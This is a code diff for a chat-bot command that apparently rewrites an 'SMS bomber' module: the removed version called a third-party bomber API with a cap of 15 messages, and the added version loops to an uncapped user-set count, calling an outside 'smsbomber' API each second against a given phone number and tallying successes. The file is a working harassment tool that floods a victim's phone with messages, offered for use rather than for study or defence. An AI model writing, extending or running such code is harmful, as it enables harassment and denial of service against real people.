@@ -1,48 +1,45 @@
-const axios = require('axios');
-const dipto = "https://www.noobs-api.rf.gd";
+const axios = require("axios");
 
 module.exports.config = {
-    name: "bikashbomber",
-    version: "2.0",
-    author: "Dip To",
-    countDown: 5,
-    role: 1,
-    category: "Bomber",
-    description: "Bikash SMS Bomber",
-    usages: "{pn} number [limit=1]",
-    dependencies: {
-        "axios": ""
-    }
+  name: "bomber",
+  version: "1.1",
+  role: 2,
+  author: "saimun sabik",
+  description: "SMS Bomber using S4B1K API with strict limit control",
+  category: "TOOLS",
+  guide: "*bomber -017xxxxxxxx -100",
+  countDown: 5
 };
 
-module.exports.onStart = async ({ api, args, message }) => {
+module.exports.onStart = async function ({ args, event, api }) {
+  if (args.length < 2 || !args[0].startsWith("-") || !args[1].startsWith("-")) {
+    return api.sendMessage("Wrong format!\nUse: *bomber -017xxxxxxxx -100", event.threadID, event.messageID);
+  }
+
+  const phone = args[0].slice(1);
+  const limit = parseInt(args[1].slice(1));
+
+  if (!/^\d{6,15}$/.test(phone)) {
+    return api.sendMessage("Invalid phone number format.", event.threadID, event.messageID);
+  }
+
+  if (isNaN(limit) || limit < 1) {
+    return api.sendMessage("Limit must be a number greater than 0.", event.threadID, event.messageID);
+  }
+
+  api.sendMessage(`Sending ${limit} SMS to ${phone}...`, event.threadID, event.messageID);
+
+  let success = 0, fail = 0;
+  for (let i = 1; i <= limit; i++) {
     try {
-        const number = args[0];
-        const limit = args[1] || 10;
-
-        if (!number) return message.reply("🔴 | Error: Phone number required!");
-        if (!/^[0-9]+$/.test(number)) return message.reply("🔴 | Error: Invalid phone number!");
-        if (limit > 15) return message.reply("🔴 | Error: Maximum limit is 15!");
-
-        const processingMsg = await message.reply("💣 | Activating Bikash Bomber...");
-
-        const { data } = await axios.get(`${dipto}/dipto/bikashBomber?number=${encodeURIComponent(number)}&limit=${limit}`);
-
-        await api.unsendMessage(processingMsg.messageID);
-
-        message.reply(`
-⚡ Bikash Bomber Results ⚡
-
-📱 Target: ${number}
-💣 Total: ${data.success + data.failed}
-✅ Success: ${data.success}
-❌ Failed: ${data.failed}
-
-📊 Status: ${data.message}
-        `.trim());
-
-    } catch (error) {
-        console.error(error);
-        message.reply(`🔴 | Bomber Failed! ${error.message}`);
+      const res = await axios.get(`https://s4b1k-api-ui-v2.onrender.com/api/smsbomber?phone=${phone}`);
+      if (res.data?.success || res.data?.message) success++;
+      else fail++;
+    } catch {
+      fail++;
     }
+    await new Promise(r => setTimeout(r, 1000)); // Delay 1 sec
+  }
+
+  api.sendMessage(`✅ Done!\nSuccess: ${success}\nFailed: ${fail}`, event.threadID);
 };
